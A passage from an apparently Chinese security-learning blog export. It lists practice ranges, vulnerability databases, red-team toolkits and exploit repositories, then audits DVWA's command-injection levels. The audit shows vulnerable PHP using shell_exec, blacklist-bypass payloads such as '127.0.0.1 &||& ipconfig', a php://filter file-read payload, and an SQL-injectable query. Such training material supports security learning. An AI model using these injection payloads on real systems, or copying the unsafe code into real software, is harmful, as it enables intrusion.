class="line"></span><br><span class="line">http://blog.safebuff.com/2016/07/03/SSRF-Tips/ ssrf 漏洞利用手册</span><br></pre></td></tr></table></figure>

<h3 id="学习靶场"><a href="#学习靶场" class="headerlink" title="学习靶场"></a>学习靶场</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.blackmoreops.com/2018/11/06/124-legal-hacking-websites-to-practice-and-learn/ 124 个合法的可以练习 Hacking 技术的网站</span><br><span class="line"></span><br><span class="line">https://www.zhihu.com/question/267204109 学 web 安全去哪里找各种各样的靶场？</span><br><span class="line"></span><br><span class="line">https://www.vulnhub.com 许多 ctf 靶机汇总https://www.wechall.net 世界知名 ctf 汇总交流网站</span><br><span class="line"></span><br><span class="line">https://www.xssgame.com 谷歌 XSS 挑战http://xss.tv 在线靶场挑战https://www.hackthebox.eu 在线靶场挑战</span><br><span class="line"></span><br><span class="line">https://www.root-me.org 在线靶场挑战http://www.itsecgames.com bWAPP，包含 100 多种漏洞环境</span><br><span class="line"></span><br><span class="line">https://github.com/c0ny1/vulstudy 多种漏洞复现系统的 docker 汇总</span><br><span class="line"></span><br><span class="line">https://github.com/bkimminich/juice-shop 常见 web 安全实验靶场市场</span><br><span class="line"></span><br><span class="line">https://github.com/ethicalhack3r/DVWA web 安全实验靶场</span><br><span class="line"></span><br><span class="line">https://www.freebuf.com/articles/web/123779.html 新手指南：DVWA-1.9 全级别教程https://github.com/78778443/permeate php，常见漏洞靶场</span><br><span class="line"></span><br><span class="line">https://github.com/gh0stkey/DoraBox php,常见漏洞靶场https://github.com/stamparm/DSVW py2,常见漏洞靶场</span><br><span class="line"></span><br><span class="line">https://github.com/amolnaik4/bodhi py,常见漏洞靶场https://github.com/Safflower/Solve-Me php，韩国一个偏代码审计的 ctf 靶场源码</span><br><span class="line"></span><br><span class="line">https://github.com/WebGoat/WebGoat 一键 jar 包，web 安全实验靶场https://github.com/Audi-1/sqli-labs 基于 SQLite 的 sql 注入学习靶场</span><br><span class="line"></span><br><span class="line">https://github.com/lcamry/sqli-labs 通过 sqli-labs 演示 mysql 相关的注入手法</span><br><span class="line"></span><br><span class="line">https://github.com/c0ny1/upload-labs 一个帮你总结所有类型的上传漏洞的靶场</span><br><span class="line"></span><br><span class="line">https://github.com/LandGrey/upload-labs-writeup upload-labs 指导手册</span><br><span class="line"></span><br><span class="line">https://github.com/Go0s/LFIboomCTF 本地文件包含漏洞&amp;&amp;PHP 利用协议&amp;&amp;实践源码</span><br><span class="line"></span><br><span class="line">https://in.security/lin-security-practise-your-linux-privilege-escalation-foo/ 一个虚拟机文件用于 linux 提权练习</span><br><span class="line"></span><br><span class="line">https://github.com/OWASP/igoat 适用于 ios 应用程序测试和安全性的学习工具</span><br><span class="line"></span><br><span class="line">https://github.com/prateek147/DVIA-v2 适用于 ios 应用程序测试和安全性的学习工具</span><br><span class="line"></span><br><span class="line">https://github.com/rapid7/metasploitable3 metasploit 练习系统</span><br><span class="line"></span><br><span class="line">https://github.com/rapid7/metasploit-vulnerability-emulator 基于 perl 的 metasploit 模拟环境，练习操作</span><br><span class="line"></span><br><span class="line">https://github.com/chryzsh/DarthSidious AD 域环境的搭建、渗透、防护</span><br><span class="line"></span><br><span class="line">https://github.com/c0ny1/xxe-lab 一个包含 php,java,python,C#等各种语言版本的 XXE 漏洞 Demo</span><br></pre></td></tr></table></figure>

<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub Vulhub 是一个面向大众的开源漏洞靶场，无需 docker 知识，执行两条命令即可编译、运行一个完整的漏洞靶场镜像</span><br><span class="line"></span><br><span class="line">https://github.com/Medicean/VulApps 收集各种漏洞环境，为方便使用，统一采用 Dockerfile 形式。同时也收集了安全工具环境。</span><br><span class="line"></span><br><span class="line">https://github.com/bingohuang/docker-labs 制作在线 docker 平台</span><br></pre></td></tr></table></figure>

<h3 id="开源漏洞库"><a href="#开源漏洞库" class="headerlink" title="开源漏洞库"></a>开源漏洞库</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://wooyun.kieran.top/#!/ 2016 年之前，乌云 Drops 文章，公开漏洞详情文章</span><br><span class="line"></span><br><span class="line">https://wooyun.js.org/ 2016 年之前，乌云 Drops 文章，公开漏洞详情文章</span><br><span class="line"></span><br><span class="line">https://dvpnet.io/list/index/state/3 公开漏洞详情文章</span><br><span class="line"></span><br><span class="line">https://sec.ly.com/bugs 同程安全公开漏洞详情文章</span><br><span class="line"></span><br><span class="line">http://ics.cnvd.org.cn 中国国家工控漏洞库</span><br><span class="line"></span><br><span class="line">https://ics-cert.us-cert.gov/advisories 美国国家工控漏洞库</span><br><span class="line"></span><br><span class="line">http://www.nsfocus.net/index.php?act=sec_bug 绿盟漏洞库，含工控</span><br><span class="line"></span><br><span class="line">http://ivd.winicssec.com/ 威努特工控漏洞库</span><br><span class="line"></span><br><span class="line">http://cve.scap.org.cn/view/ics CVE 中文工控漏洞库</span><br><span class="line"></span><br><span class="line">https://cve.mitre.org/cve/search_cve_list.html 美国 MITRE 公司负责维护的 CVE 漏洞库</span><br><span class="line"></span><br><span class="line">https://www.exploit-db.com 美国 Offensive Security 的漏洞库</span><br><span class="line"></span><br><span class="line">https://nvd.nist.gov/vuln/search 美国国家信息安全漏洞库</span><br></pre></td></tr></table></figure>

<h3 id="工具包集合"><a href="#工具包集合" class="headerlink" title="工具包集合"></a>工具包集合</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.4hou.com/web/11241.html 史上最全攻击模拟工具盘点</span><br><span class="line"></span><br><span class="line">https://github.com/infosecn1nja/Red-Teaming-Toolkit 信息收集、攻击尝试获得权限、持久性控制、权限提升、网络信息收集、横向移动、数据分析（在这个基础上再做持久化控制）、清理痕迹</span><br><span class="line"></span><br><span class="line">https://github.com/toolswatch/blackhat-arsenal-tools 黑帽大会工具集</span><br><span class="line"></span><br><span class="line">https://www.cnblogs.com/k8gege K8 哥哥工具包集合。解压密码 </span><br><span class="line"></span><br><span class="line">Kk8team,Kk8gegehttps://github.com/n00py/ReadingList/blob/master/gunsafe.txt 安全工具集</span><br><span class="line"></span><br><span class="line">https://github.com/Ridter/Pentest 安全工具集</span><br><span class="line"></span><br><span class="line">https://github.com/redcanaryco/atomic-red-team win、linux、mac 等多方面 apt 利用手段、技术与工具集</span><br><span class="line"></span><br><span class="line">https://github.com/Cooolis/Cooolis.github.io Cooolis 是一个操作系统命令技巧备忘录，</span><br><span class="line"></span><br><span class="line">https://cooolis.payloads.onlinehttps://github.com/LOLBAS-Project/LOLBAS 常见的渗透测试利用的脚本与二进制文件集合</span><br><span class="line"></span><br><span class="line">https://www.owasp.org/index.php/File:CSRFTester-1.0.zip csrf 验证工具</span><br><span class="line"></span><br><span class="line">https://github.com/ufrisk/MemProcFS 以访问文件系统的方式访问物理内存, 可读写, 有易于使用的接口. 当前支持 Windows</span><br><span class="line"></span><br><span class="line">https://github.com/vletoux/SpoolerScanner 检测 Windows 远程打印机服务是否开启的工具</span><br><span class="line"></span><br><span class="line">https://github.com/sirpsycho/firecall 直接向 CiscoASA 防火墙发送命令, 无需登录防火墙后再做修改</span><br><span class="line"></span><br><span class="line">https://github.com/jboss-javassist/javassist 能够操作字节码框架，通过它我们能很轻易的修改 class 代码文件</span><br><span class="line"></span><br><span class="line">https://github.com/ConsenSys/mythril-classic 用于以太坊智能协议的安全分析工具</span><br><span class="line"></span><br><span class="line">https://github.com/a13xp0p0v/kconfig-hardened-check 用于检查 Linux 内核配置中的安全加固选项的脚本</span><br><span class="line"></span><br><span class="line">https://github.com/lionsoul2014/ip2region ip 地址定位库，支持 python3 等多接口。类比 geoip</span><br><span class="line"></span><br><span class="line">https://github.com/m101/hsploit 基于 rust 的 HEVD 漏洞利用程序</span><br><span class="line"></span><br><span class="line">https://github.com/ticarpi/jwt_tool 针对 json web token 的检测</span><br><span class="line"></span><br><span class="line">https://github.com/clr2of8/DPAT 域密码配置审计</span><br><span class="line"></span><br><span class="line">https://github.com/chenjj/CORScanner 域解析漏洞，跨域扫描器</span><br><span class="line"></span><br><span class="line">https://github.com/dienuet/crossdomain 域解析漏洞，跨域扫描器</span><br><span class="line"></span><br><span class="line">https://github.com/sfan5/fi6s ipv6 端口快速扫描器</span><br><span class="line"></span><br><span class="line">https://github.com/lavalamp-/ipv666 go,ipv6 地址枚举扫描</span><br><span class="line"></span><br><span class="line">https://github.com/commixproject/commix 命令注入漏洞扫描</span><br><span class="line"></span><br><span class="line">https://github.com/Graph-X/davscan DAVScan 是一款快速轻便的 webdav 扫描仪，旨在发现 DAV 启用的 Web 服务器上的隐藏文件和文件夹</span><br><span class="line"></span><br><span class="line">https://github.com/jcesarstef/dotdotslash 目录遍历漏洞测试</span><br><span class="line"></span><br><span class="line">https://github.com/P3GLEG/WhaleTail 根据 docker 镜像生成成 dockerfile</span><br><span class="line"></span><br><span class="line">https://github.com/cr0hn/dockerscan docker 扫描工具</span><br><span class="line"></span><br><span class="line">https://github.com/utiso/dorkbot 通过定制化的谷歌搜索引擎进行漏洞页面搜寻及扫描</span><br><span class="line"></span><br><span class="line">https://github.com/NullArray/DorkNet 基于搜索引擎的漏洞网页搜寻</span><br><span class="line"></span><br><span class="line">https://github.com/panda-re/lava 大规模向程序中植入恶意程序</span><br><span class="line"></span><br><span class="line">https://github.com/woj-ciech/Danger-zone 关联域名、IP 和电子邮件地址之间的数据并将其可视化输出</span><br><span class="line"></span><br><span class="line">https://github.com/securemode/DefenderKeys 枚举出被 Windows Defender 排除扫描的配置</span><br><span class="line"></span><br><span class="line">https://github.com/D4Vinci/PasteJacker 剪贴板劫持利用工具</span><br><span class="line"></span><br><span class="line">https://github.com/JusticeRage/freedomfighting 日志清理、文件共享、反向 shell、简单爬虫工具包</span><br><span class="line"></span><br><span class="line">https://github.com/gh0stkey/PoCBox 漏洞测试验证辅助平台，SONP 劫持、CORS、Flash 跨域资源读取、Google Hack 语法生成、URL 测试字典生成、JavaScript URL 跳转、302 URL 跳转</span><br><span class="line"></span><br><span class="line">https://github.com/jakubroztocil/httpie http 调试工具，类似 curl，功能更完善</span><br><span class="line"></span><br><span class="line">https://www.getpostman.com/ http 调试工具，带界面</span><br></pre></td></tr></table></figure>

<h3 id="漏洞收集与-Exp、Poc-利用"><a href="#漏洞收集与-Exp、Poc-利用" class="headerlink" title="漏洞收集与 Exp、Poc 利用"></a>漏洞收集与 Exp、Poc 利用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/Lcys/Python_PoC python3 的 poc、exp 快速编写模板，有众多模范版本</span><br><span class="line"></span><br><span class="line">https://github.com/raminfp/linux_exploit_development linux 漏洞利用开发手册</span><br><span class="line"></span><br><span class="line">https://github.com/mudongliang/LinuxFlaw 包含 linux 下软件漏洞列表</span><br><span class="line"></span><br><span class="line">https://github.com/coffeehb/Some-PoC-oR-ExP 各种漏洞 poc、Exp 的收集或编写</span><br><span class="line"></span><br><span class="line">https://github.com/userlandkernel/plataoplomo Sem Voigtländer 公开其发现的 iOS 中各种漏洞，包</span><br><span class="line">括（Writeup/POC/Exploit）</span><br><span class="line"></span><br><span class="line">https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/check_icmp_dos.py CVE-2018-4407，macos/ios 缓冲区溢出可导致系统崩溃</span><br><span class="line"></span><br><span class="line">https://github.com/vulnersCom/getsploit py2,仿照 searchsploit 通过各种数据库的官方接口进行 payload 的查找</span><br><span class="line"></span><br><span class="line">https://github.com/SecWiki/CMS-Hunter CMS 漏洞测试用例集合https://github.com/Mr5m1th/0day 各种开源 CMS 各种版本的漏洞以及 EXP</span><br><span class="line"></span><br><span class="line">https://github.com/w1109790800/penetration CMS 新老版本 exp 与系统漏洞搜集表</span><br><span class="line"></span><br><span class="line">https://github.com/blacknbunny/libSSH-Authentication-Bypass CVE-2018-10933，libssh 服务端身份验证绕过</span><br><span class="line"></span><br><span class="line">https://github.com/leapsecurity/libssh-scanner CVE-2018-10933，libssh 服务端身份验证绕过https://github.com/anbai-inc/CVE-2018-4878 Adobe Flash Exploit 生成 payload</span><br><span class="line"></span><br><span class="line">https://github.com/RetireJS/grunt-retire 扫描 js 扩展库的常见漏洞</span><br><span class="line"></span><br><span class="line">https://github.com/coffeehb/SSTIF 服务器端模板注入漏洞的半自动化工具</span><br><span class="line"></span><br><span class="line">https://github.com/tijme/angularjs-csti-scanner 探测客户端 AngularJS 模板注入漏洞工具</span><br><span class="line"></span><br><span class="line">https://github.com/blackye/Jenkins Jenkins 漏洞探测、用户抓取爆破</span><br><span class="line"></span><br><span class="line">https://github.com/epinna/tplmap 服务器端模板注入漏洞检测与利用工具</span><br><span class="line"></span><br><span class="line">https://github.com/irsdl/IIS-ShortName-Scanner Java,IIS 短文件名暴力枚举漏洞利用工具</span><br><span class="line"></span><br><span class="line">https://github.com/lijiejie/IIS_shortname_Scanner py2,IIS 短文件名漏洞扫描</span><br><span class="line"></span><br><span class="line">https://github.com/rudSarkar/crlf-injector CRLF 注入漏洞批量扫描</span><br><span class="line"></span><br><span class="line">https://github.com/hahwul/a2sv SSL 漏洞扫描，例如心脏滴血漏洞等</span><br><span class="line"></span><br><span class="line">https://github.com/jagracey/Regex-DoS RegEx 拒绝服务扫描器</span><br><span class="line"></span><br><span class="line">https://github.com/Bo0oM/PHP_imap_open_exploit 利用 imap_open 绕过 php exec 函数禁用</span><br><span class="line"></span><br><span class="line">https://www.anquanke.com/post/id/106488 利用 mysql 服务端恶意配置读取客户端文件，（如何利用 MySQL </span><br><span class="line">LOCAL INFILE 读取客户端文件，Read MySQL Client&#x27;s File，【技术分享】从 MySQL 出发的反击之路）</span><br><span class="line"></span><br><span class="line">https://www.waitalone.cn/awvs-poc.html CVE-2015-4027，AWVS10 命令执行漏洞</span><br><span class="line"></span><br><span class="line">http://an7isec.blogspot.com/2014/04/pown-noobs-acunetix-0day.html Pwn the n00bs - Acunetix 0day，awvs8 命令执行漏洞</span><br><span class="line"></span><br><span class="line">https://github.com/numpy/numpy/issues/12759 科学计算框架 numpy 命令执行 RCE 漏洞</span><br><span class="line"></span><br><span class="line">https://github.com/petercunha/Jenkins-PreAuth-RCE-PoC jenkins 远程命令执行</span><br><span class="line"></span><br><span class="line">https://github.com/WyAtu/CVE-2018-20250 WinRar 执行漏洞加使用介绍</span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>安全合辑</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计-初篇</title>
    <url>/2020/05/02/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%88%9D%E7%AF%87/</url>
    <content><![CDATA[<h1 id="PHP中支持的伪协议"><a href="#PHP中支持的伪协议" class="headerlink" title="PHP中支持的伪协议"></a>PHP中支持的伪协议</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line">php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">zlib:<span class="comment">// — 压缩流</span></span><br><span class="line">data:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">// — RAR</span></span><br><span class="line">ogg:<span class="comment">// — 音频流</span></span><br><span class="line">expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>

<span id="more"></span> 

<h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><blockquote>
<p>php://filter在双off的情况下也可以正常使用；<br>条件：<br><strong>不需要开启allow_url_fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。</strong></p>
</blockquote>
<p><strong>php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</strong></p>
<p>php://filter</p>
<p><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resource=&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read=&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write=&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;        任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure>

<p>payload: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=./1.txt</span><br></pre></td></tr></table></figure>



<p>php://input</p>
<p>php://input代表可以访问请求的原始数据，简单来说POST请求的情况下，php://input可以获取到post的数据。</p>
<p>比较特殊的一点，enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
<p>php://output</p>
<p>php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>准备材料<br>； - 分号在linux命令执行的时候，可以直接执行几条命令，命令与命令之间用分号隔开</p>
<p>&amp; 前面的命令执行后接着执行候命的命令</p>
<p>&amp;&amp; 前面的命令执行成功后才可以执行下面的命令</p>
<p>| 前面的命令输出结果做为后面命令输入的内容</p>
<p>|| 前面的命令执行失败后才会执行后面的命令</p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">	// Determine OS and execute the ping command.</span><br><span class="line">	if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">		// Windows</span><br><span class="line">		$cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		// *nix</span><br><span class="line">		$cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Feedback for the end user</span><br><span class="line">	$html .= &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计：</p>
<p>先判断是否得到了一个提交的参数，然后，将IP地址赋予target参数</p>
<p>再判断是否为Windows系统，如果是win则执行第一个命令，如果不是就在命令加上-c选项，因为linux什么的操作系统中ping命令是一直执行的。只有加了-c指定发送的跳数才能停止</p>
<p>可以确定的是，完全没有添加防护措施，那就简单了，直接随便用一个吧（见0x00）</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sdbet || ipconfig</span><br></pre></td></tr></table></figure>



<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">	// Set blacklist</span><br><span class="line">	$substitutions = array(</span><br><span class="line">		&#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">		&#x27;;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	// Remove any of the charactars in the array (blacklist).</span><br><span class="line">	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">	// Determine OS and execute the ping command.</span><br><span class="line">	if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">		// Windows</span><br><span class="line">		$cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		// *nix</span><br><span class="line">		$cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Feedback for the end user</span><br><span class="line">	$html .= &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计：</p>
<p>其他地方和上一个差不多，唯一不同的就是，它将&amp;&amp;和；变成了数组中的元素，再通过str_replace函数，进行空格替换，从而顾虑了&amp;&amp;和；，但没关系，又不是只有那两个字符串。</p>
<p>涉及函数：</p>
<p>[array_keys][<a href="https://www.runoob.com/php/func-array-keys.html]">https://www.runoob.com/php/func-array-keys.html]</a></p>
<p>[str_replace][<a href="https://www.w3school.com.cn/php/func_string_str_replace.asp]">https://www.w3school.com.cn/php/func_string_str_replace.asp]</a></p>
<p>paylaod:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; ipconfig</span><br></pre></td></tr></table></figure>



<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$target = trim($_REQUEST[ &#x27;ip&#x27; ]);</span><br><span class="line"></span><br><span class="line">	// Set blacklist</span><br><span class="line">	$substitutions = array(</span><br><span class="line">		&#x27;&amp;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">		&#x27;;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">		&#x27;| &#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">		&#x27;-&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">		&#x27;$&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">		&#x27;(&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">		&#x27;)&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">		&#x27;`&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">		&#x27;||&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	// Remove any of the charactars in the array (blacklist).</span><br><span class="line">	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">	// Determine OS and execute the ping command.</span><br><span class="line">	if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">		// Windows</span><br><span class="line">		$cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		// *nix</span><br><span class="line">		$cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Feedback for the end user</span><br><span class="line">	$html .= &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计：</p>
<p>很聪明，直接过滤掉了所有可能的连接符，但只做了一次防护，反之，过滤了第一次后，那剩下的连接符就连接起来咯</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp;||&amp; ipconfig</span><br></pre></td></tr></table></figure>



<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">	// Check Anti-CSRF token</span><br><span class="line">	checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">	// Get input</span><br><span class="line">	$target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line">	$target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">	// Split the IP into 4 octects</span><br><span class="line">	$octet = explode( &quot;.&quot;, $target );</span><br><span class="line"></span><br><span class="line">	// Check IF each octet is an integer</span><br><span class="line">	if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123;</span><br><span class="line">		// If all 4 octets are int&#x27;s put the IP back together.</span><br><span class="line">		$target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3];</span><br><span class="line"></span><br><span class="line">		// Determine OS and execute the ping command.</span><br><span class="line">		if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">			// Windows</span><br><span class="line">			$cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">		&#125;</span><br><span class="line">		else &#123;</span><br><span class="line">			// *nix</span><br><span class="line">			$cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// Feedback for the end user</span><br><span class="line">		$html .= &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		// Ops. Let the user name theres a mistake</span><br><span class="line">		$html .= &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计：</p>
<p>explode() 函数把字符串打散为数组</p>
<p>stripslashes删除反斜杠</p>
<p>is_numeric() 函数用于检测变量是否为数字或数字字符串。</p>
<p>涉及函数：</p>
<p>[stripslashes][<a href="https://www.w3school.com.cn/php/func_string_stripslashes.asp]">https://www.w3school.com.cn/php/func_string_stripslashes.asp]</a></p>
<p>[explode][<a href="https://www.w3school.com.cn/php/func_string_explode.asp]">https://www.w3school.com.cn/php/func_string_explode.asp]</a></p>
<p>[is_numeric()][<a href="https://www.runoob.com/php/php-is_numeric-function.html]">https://www.runoob.com/php/php-is_numeric-function.html]</a></p>
<p>payload：这个我不会，哈哈。</p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_REQUEST[ &#x27;Submit&#x27; ] ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$id = $_REQUEST[ &#x27;id&#x27; ];</span><br><span class="line"></span><br><span class="line">	// Check database</span><br><span class="line">	$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">	// Get results</span><br><span class="line">	while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">		// Get values</span><br><span class="line">		$first = $row[&quot;first_name&quot;];</span><br><span class="line">		$last  = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">		// Feedback for end user</span><br><span class="line">		$html .= &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span 